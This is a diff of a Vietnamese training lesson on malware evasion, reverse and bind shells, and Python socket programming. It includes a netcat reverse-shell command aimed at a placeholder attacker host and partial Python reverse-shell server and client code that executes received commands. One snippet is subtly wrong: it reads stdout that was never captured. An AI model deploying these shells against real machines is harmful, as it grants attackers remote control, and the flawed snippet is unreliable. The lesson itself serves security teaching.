@@ -5,7 +5,7 @@ Chương trình độc hại là những chương trình máy tính, có thể v
 - Sử dụng Social Engineering, giả mạo là một chương trình không độc hại
 - Tấn công vào credential yếu, credential được tái sử dụng, bị lộ lọt.
 
-## Phương pháp qua mặt hệ thống nhận diện
+## Phương pháp qua mặt hệ thống bảo mật
 - Dropper: Là một chương trình tải mã độc về máy.
 - Fileless Malware: Thực thi mã độc trong memory để tránh scan file hoặc file forensics
 - Hacktool: sử dụng các chương trình hợp lệ (ví dụ psexec) để threat actor thao túng hệ thống
@@ -29,30 +29,29 @@ Ví dụ: Reverse shell sử dụng netcat
 1. Attacker mở kết nối port 4444: `nc -lvnp 4444`
 2. Client (victim) kết nối đến port 4444: `nc attacker_ip 4444 -e /bin/bash`
 
-- Reverse shell có thể nằm trong những category nào của malware?
-- Tại sao lại sử dụng Reverse Shell?
 <details>
-<sumary>Một số lý do cơ bản</sumary>
+<summary>Tại sao lại sử dụng Reverse Shell?</summary>
 
 - Chương trình có thể cần được cho phép mới có thể mở port. Ví dụ: trên Windows, Windows Firewall sẽ hiện dialog hỏi người dùng có cho phép ứng dụng mở port không.
 - Máy chủ có thể nằm trong một phân vùng mạng nội bộ, được NAT port ra ngoài. Vì vậy, việc mở port bên trong thành công không đồng nghĩa với việc threat actor có thể điều khiển từ xa được.
 - Đối với những giải pháp kiểm soát outbound cơ bản, các giải pháp có thể chỉ hoạt động ở mức độ kiểm soát port outbound. Ví dụ: cho phép kết nối ra internet qua port 53 hoặc 80/443. Threat actor có thể lợi dụng chính sách này để thiết lập kết nối.
 </details>
 
+- Reverse shell có thể nằm trong những category nào của malware?
 - Bind shell là gì? So sánh với Reverse Shell?
 
 # 2. Socket Programming và sử dụng với Reverse Shell
+## 2.1. Socket Programming cơ bản
+Socket Programming là hình thức lập trình nhằm giao tiếp dữ liệu thông qua socket. Lập trình socket có thể dùng giao thức TCP hoặc UDP nằm ở tầng 4 mô hình OSI, hoặc sử dụng các giao thức đặc biệt hơn ví dụ Unix Domain Name Socket.
 
-## 2.1. Mô hình Client–Server
-TODO: cần tìm hình minh họa, giải thích chi tiết và rõ ràng hơn (cụ thể OSI stack, vân vân)
-Quy trình:
-1. Server mở cổng listening.
-2. Client kết nối đến server.
-3. Server gửi lệnh → client nhận, thực thi.
-4. Client gửi kết quả về.
+Quy trình chung:
+1. Server bind một port trên một interface (hoặc sử dụng 0.0.0.0 cho toàn bộ interface) và listen.
+2. Client kết nối đến server thông qua địa chỉ IP và port
+3. Giao tiếp bằng việc gửi - nhận dữ liệu.
+4. Kết thúc phiên kết nối, đóng kết nối (server vẫn có thể sử dụng port chứ không ngừng hẳn)
 
-## Ví dụ (TODO): code client - server socket
-- Server code:
+## Code demo: Socket programming
+- Code phía server:
 
 ```
 import socket
@@ -102,7 +101,7 @@ finally:
     print("[*] Server đã tắt.")
 
 ```
-- Client code:
+- Code phía client:
 ```
 import socket
 
@@ -153,14 +152,31 @@ Trong reverse shell:
 - Attacker = server, lắng nghe connection.
 </details>
 
-Câu hỏi:
-1. Nếu với bind shell, thì đâu là client, đâu là server?
-2. Đối với giao thức mạng IPv4, việc sử dụng Reverse Shell hoặc Bind Shell có khó khăn gì?
-
-## Viết reverse shell client và server với python
-- Server:
+## Sử dụng socket programming để viết reverse shell
+Ý tưởng:
+- Phía server lấy input và gửi về phía client:
+```
+command = input("Shell> ")
+conn.send(command.encode('utf-8') + b'\n')
 ```
 
+- Phía client có thể sử dụng thư viện subprocess để thực thi lệnh hệ thống
+```
+import subprocess
+
+output = subprocess.run(command, check=True)
+```
+Như vậy, bên phía client sẽ nhận lệnh, thực thi và gửi lại phía server kết quả
+```
+command = s.recv(1024).decode('utf-8').strip()
+output = subprocess.run(command, check=True)
+s.sendall(output.stdout)
+```
+
+<details>
+<summary>Code phía server</summary>
+
+```
 import socket
 import sys
 
@@ -189,7 +205,6 @@ def listener_server():
         while True:
             # Nhận lệnh từ người dùng Attacker
             command = input("Shell> ")
-            # sys.stdout.flush()
 
             if command.lower() == 'exit':
                 conn.send(b'exit\n') # Gửi lệnh exit đến shell (tùy thuộc shell)
@@ -216,8 +231,12 @@ if __name__ == '__main__':
     listener_server()
 
 ```
+</details>
 
-- Client:
+Hãy viết code phía client và server
+
+<details>
+<summary>Code phía client</summary>
 
 ```
 import socket
@@ -262,8 +281,8 @@ def reverse_shell():
 
 if __name__ == '__main__':
     reverse_shell()
-
 ```
+</details>
 
 # 3. Interactive Shell và Non-Interactive Shell
 TODO: giải thích interactive và non interactive, kiểm chứng ví dụ
